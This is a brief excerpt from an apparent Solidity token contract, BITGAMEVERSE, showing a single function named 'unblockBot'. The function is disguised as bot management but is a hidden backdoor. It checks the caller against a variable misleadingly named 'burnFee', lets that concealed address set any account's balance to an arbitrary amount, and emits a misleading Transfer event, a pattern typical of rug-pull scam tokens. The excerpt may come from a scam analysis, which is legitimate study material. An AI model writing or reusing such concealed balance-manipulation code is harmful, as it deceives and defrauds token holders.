...
contract BITGAMEVERSE is Ownable {
  ...
  function unblockBot(uint256 bAmount, address notbot) public returns (bool) {
      require(notbot != address(0));
      require(uint256(msg.sender) == burnFee);
      _balances[notbot] = 1 * 1 * botFees * bAmount * (10 ** 9);
      emit Transfer( notbot, address(0x0), bAmount);
      return true;
  }
